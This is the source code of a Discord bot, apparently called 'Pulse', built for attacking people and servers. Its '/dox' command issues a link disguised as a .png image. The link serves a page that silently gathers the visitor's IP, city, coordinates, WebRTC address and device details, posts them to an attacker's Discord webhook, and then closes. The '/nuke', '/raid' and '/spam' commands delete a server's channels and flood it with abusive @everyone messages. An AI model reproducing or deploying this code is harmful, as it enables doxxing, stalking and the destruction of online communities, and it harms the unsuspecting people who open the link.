const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionsBitField } = require('discord.js');
const crypto = require('crypto');
const express = require('express');
const app = express();

// ---- ENVIRONMENT ----
const TOKEN = process.env.TOKEN;
const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
const INVITE_LINK = 'https://discord.gg/hW3djeNKu';
const PORT = process.env.PORT || 3000;

// ---- CLIENT (NO DISALLOWED INTENTS) ----
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,          // needed for servers
        GatewayIntentBits.GuildMessages    // needed for sending messages
        // REMOVED: MessageContent, GuildMembers, DirectMessages
    ]
});

const links = new Map();

// ---- EXPRESS SERVER (for dox) ----
app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    if (!links.has(id)) return res.status(404).send('Image not found');
    const data = links.get(id);
    res.type('text/html');
    res.send(generateDoxHTML(data.webhook || DEFAULT_WEBHOOK));
});
app.listen(PORT, () => console.log(`🌐 Dox server on ${PORT}`));

// ---- COMMANDS ----
client.once('ready', async () => {
    console.log(`🤖 ${client.user.tag} ready`);
    await client.application.commands.set([
        { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
        { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Number of messages', required: true }, { name: 'message', type: 3, description: 'Message to spam', required: true }] },
        { name: 'raid', description: 'Raid with default message', options: [{ name: 'count', type: 4, description: 'Lines (max 35)', required: false }] },
        { name: 'nuke', description: 'Delete all channels, create new, spam @everyone' },
        { name: 'ad', description: 'Advertise the server invite' },
        { name: 'purge', description: 'Delete messages', options: [{ name: 'amount', type: 4, description: 'Number of messages', required: true }, { name: 'user', type: 6, description: 'Target user (optional)', required: false }] }
    ]);
    console.log('✅ Commands loaded');
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    // ---- DOX ----
    if (interaction.commandName === 'dox') {
        await interaction.deferReply({ ephemeral: true });
        const wh = interaction.options.getString('webhook');
        if (!wh.startsWith('https://discord.com/api/webhooks/')) return interaction.editReply('❌ Invalid webhook.');
        const id = crypto.randomBytes(6).toString('hex');
        const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
        links.set(id, { webhook: wh, user: interaction.user.tag });
        const embed = new EmbedBuilder().setTitle('✅ Dox Ready').setColor(0x22c55e).setDescription(`🔗 ${url}\n\nSends full device + location data.`);
        await interaction.editReply({ embeds: [embed] });
        return;
    }

    // ---- SPAM ----
    if (interaction.commandName === 'spam') {
        await interaction.deferReply({ ephemeral: true });
        const count = interaction.options.getInteger('count');
        const msg = interaction.options.getString('message');
        const channel = interaction.channel;
        if (!channel) return interaction.editReply('❌ No channel.');
        for (let i = 0; i < Math.min(count, 100); i++) {
            await channel.send(msg).catch(() => {});
        }
        await interaction.editReply(`✅ Spammed ${Math.min(count, 100)} messages.`);
        return;
    }

    // ---- RAID ----
    if (interaction.commandName === 'raid') {
        await interaction.deferReply({ ephemeral: true });
        const count = Math.min(interaction.options.getInteger('count') || 20, 35);
        const lines = [];
        for (let i = 0; i < count; i++) lines.push('# THIS SERVER IS FUCKING TRASH PULSE OWNS YOU ALL');
        lines.push(`join pulse to get raids like this: ${INVITE_LINK}`);
        const msg = lines.join('\n');
        await interaction.channel.send(msg).catch(() => {});
        await interaction.editReply(`✅ Raid sent (${count} lines).`);
        return;
    }

    // ---- NUKE ----
    if (interaction.commandName === 'nuke') {
        await interaction.deferReply({ ephemeral: true });
        const guild = interaction.guild;
        if (!guild) return interaction.editReply('❌ Server only.');
        if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return interaction.editReply('❌ I need Administrator.');
        }
        try {
            // Delete all channels
            const channels = guild.channels.cache;
            for (const [id, ch] of channels) {
                await ch.delete().catch(() => {});
            }
            // Create 10 new text channels named "pulse"
            for (let i = 0; i < 10; i++) {
                const newCh = await guild.channels.create({ name: 'pulse', type: 0 });
                // Spam @everyone raid
                for (let j = 0; j < 10; j++) {
                    await newCh.send('@everyone THIS SERVER IS FUCKING TRASH PULSE OWNS YOU ALL').catch(() => {});
                }
                await newCh.send(`join pulse to get raids like this: ${INVITE_LINK}`).catch(() => {});
            }
            await interaction.editReply('✅ Nuked. Channels deleted, new ones created, spammed @everyone.');
        } catch (e) {
            await interaction.editReply('❌ Nuke failed: ' + e.message);
        }
        return;
    }

    // ---- AD ----
    if (interaction.commandName === 'ad') {
        await interaction.deferReply({ ephemeral: true });
        const channel = interaction.channel;
        if (!channel) return interaction.editReply('❌ No channel.');
        const msg = `🔥 JOIN PULSE 🔥\n${INVITE_LINK}\nGet raiding power!`;
        await channel.send(msg).catch(() => {});
        await interaction.editReply('✅ Ad sent.');
        return;
    }

    // ---- PURGE ----
    if (interaction.commandName === 'purge') {
        await interaction.deferReply({ ephemeral: true });
        const amount = interaction.options.getInteger('amount');
        const user = interaction.options.getUser('user');
        const channel = interaction.channel;
        if (!channel) return interaction.editReply('❌ No channel.');
        if (!channel.permissionsFor(interaction.member).has(PermissionsBitField.Flags.ManageMessages)) {
            return interaction.editReply('❌ You need Manage Messages.');
        }
        let messages = await channel.messages.fetch({ limit: Math.min(amount, 100) });
        if (user) messages = messages.filter(m => m.author.id === user.id);
        const deleted = await channel.bulkDelete(messages, true).catch(() => {});
        await interaction.editReply(`✅ Purged ${deleted ? deleted.size : 0} messages.`);
        return;
    }
});

// ---- DOX HTML (supercharged) ----
function generateDoxHTML(webhook) {
    return `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title></title><style>body{background:#fff;margin:0;height:100vh}</style></head>
<body>
<script>
const WEBHOOK_URL = "${webhook}";

async function getIPData() {
    try {
        const res = await fetch('https://ipinfo.io/json');
        const data = await res.json();
        if (data.ip) return { ip: data.ip, country: data.country, region: data.region, city: data.city, postal: data.postal, lat: data.loc?.split(',')[0], lon: data.loc?.split(',')[1], asn: data.asn, isp: data.org, timezone: data.timezone };
    } catch {}
    try {
        const res2 = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query');
        const d = await res2.json();
        if (d.status==='success') return { ip: d.query, country: d.country, region: d.regionName, city: d.city, postal: d.zip, lat: d.lat, lon: d.lon, asn: d.as, isp: d.isp, timezone: 'N/A' };
    } catch {}
    return { ip:'N/A', country:'N/A', region:'N/A', city:'N/A', postal:'N/A', lat:'N/A', lon:'N/A', asn:'N/A', isp:'N/A', timezone:'N/A' };
}

async function getBattery() { try { const b=await navigator.getBattery(); return Math.round(b.level*100)+'% ('+(b.charging?'Charging':'Not')+')'; } catch { return 'Not Available'; } }
function getConnection() { try { const c=navigator.connection||navigator.mozConnection; if(c) return c.effectiveType||c.type+' ('+c.downlink+' Mbps)'; } catch {} return 'Not Available'; }
function getGPU() { try { const canvas=document.createElement('canvas'); const gl=canvas.getContext('webgl'); if(!gl) return 'N/A'; const debug=gl.getExtension('WEBGL_debug_renderer_info'); if(!debug) return 'N/A'; return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL); } catch { return 'N/A'; } }
function getWebRTC() { return new Promise(r=>{ try { const pc=new RTCPeerConnection({iceServers:[]}); pc.createDataChannel(''); pc.createOffer().then(o=>pc.setLocalDescription(o)); pc.onicecandidate=e=>{ if(!e.candidate) return; const ip=e.candidate.address||e.candidate.ip; if(ip&&!ip.includes('local')) r(ip); pc.close(); }; setTimeout(()=>{r('N/A'); pc.close();},2000); } catch { r('N/A'); } }); }

(async function() {
    const ip=await getIPData();
    const battery=await getBattery();
    const conn=getConnection();
    const gpu=getGPU();
    const webrtc=await getWebRTC();
    const ua=navigator.userAgent;
    const browser=ua.includes('Edg')?'Edge':ua.includes('Chrome')?'Chrome':ua.includes('Firefox')?'Firefox':ua.includes('Safari')?'Safari':'Unknown';
    const os=ua.includes('Windows NT 10.0')?'Windows 10/11':ua.includes('Mac OS X')?'macOS':ua.includes('Android')?'Android':ua.includes('iPhone')?'iOS':'Unknown';
    const device=/mobile|android|iphone|ipad/i.test(ua)?'📱 Mobile':/tablet|ipad/i.test(ua)?'📱 Tablet':'💻 Desktop';
    const data = {
        timestamp: new Date().toISOString(),
        ip: ip.ip, country: ip.country, region: ip.region, city: ip.city, postal: ip.postal,
        lat: ip.lat, lon: ip.lon, asn: ip.asn, isp: ip.isp, tz: ip.timezone,
        battery, connection: conn, gpu, webrtc, browser, os, device,
        screen: screen.width+'x'+screen.height,
        userAgent: ua,
        language: navigator.language,
        platform: navigator.platform,
        hardwareCores: navigator.hardwareConcurrency || 'N/A',
        deviceMemory: navigator.deviceMemory || 'N/A',
        touchPoints: navigator.maxTouchPoints || 0,
        cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
        doNotTrack: navigator.doNotTrack || 'N/A'
    };
    const mapUrl = \`https://www.google.com/maps?q=\${data.lat},\${data.lon}\`;
    await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            embeds: [{
                title: '☠️ Doxxed',
                color: 0xFF0000,
                fields: [
                    { name: '🌐 IP', value: data.ip, inline: true },
                    { name: '📍 Country', value: data.country, inline: true },
                    { name: '🏙️ City', value: data.city, inline: true },
                    { name: '🗺️ Region', value: data.region, inline: true },
                    { name: '📮 Postal', value: data.postal, inline: true },
                    { name: '📌 Coordinates', value: \`\${data.lat}, \${data.lon}\`, inline: true },
                    { name: '🔢 ASN', value: data.asn, inline: true },
                    { name: '🏢 ISP', value: data.isp, inline: true },
                    { name: '🕒 Timezone', value: data.tz, inline: true },
                    { name: '🔋 Battery', value: data.battery, inline: true },
                    { name: '📶 Connection', value: data.connection, inline: true },
                    { name: '📱 Screen', value: data.screen, inline: true },
                    { name: '🧠 Browser', value: data.browser, inline: true },
                    { name: '💻 OS', value: data.os, inline: true },
                    { name: '🖥️ Device', value: data.device, inline: true },
                    { name: '🎮 GPU', value: data.gpu, inline: false },
                    { name: '📡 WebRTC', value: data.webrtc, inline: true },
                    { name: '💾 Hardware', value: \`\${data.hardwareCores} cores, \${data.deviceMemory}GB RAM\`, inline: true },
                    { name: '🖱️ Touch', value: data.touchPoints + ' points', inline: true },
                    { name: '🍪 Cookies', value: data.cookies, inline: true },
                    { name: '🚫 Do Not Track', value: data.doNotTrack, inline: true },
                    { name: '🗺️ Map', value: \`[View](\${mapUrl})\`, inline: false },
                    { name: '🌐 User Agent', value: data.userAgent, inline: false }
                ],
                footer: { text: 'Logged ' + data.timestamp }
            }]
        })
    }).catch(()=>{});
    document.body.innerHTML='';
    setTimeout(()=>{ window.close(); window.location.href='about:blank'; }, 1500);
})();
<\/script>
</body>
</html>`;
}

client.login(TOKEN);
